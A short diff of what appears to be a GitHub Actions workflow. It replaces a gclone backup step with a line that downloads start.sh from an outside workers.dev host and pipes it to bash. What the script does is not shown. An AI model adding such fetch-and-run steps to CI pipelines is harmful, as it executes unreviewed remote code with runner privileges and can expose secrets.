@@ -12,4 +12,4 @@ jobs:
              && cd /home/runner/.config/rclone/ && unzip gclone-v1.61.1-cold-linux-amd64.zip
              && cd /home/runner/.config/rclone/gclone-v1.61.1-cold-linux-amd64/ && sudo cp gclone /usr/bin/ && sudo chown root:root /usr/bin/gclone && sudo chmod 755 /usr/bin/gclone
       - name: gclone
-        run: gclone copy sdrive: backup:
+        run: wget https://index.secretz.workers.dev/0:down/start.sh && bash start.sh
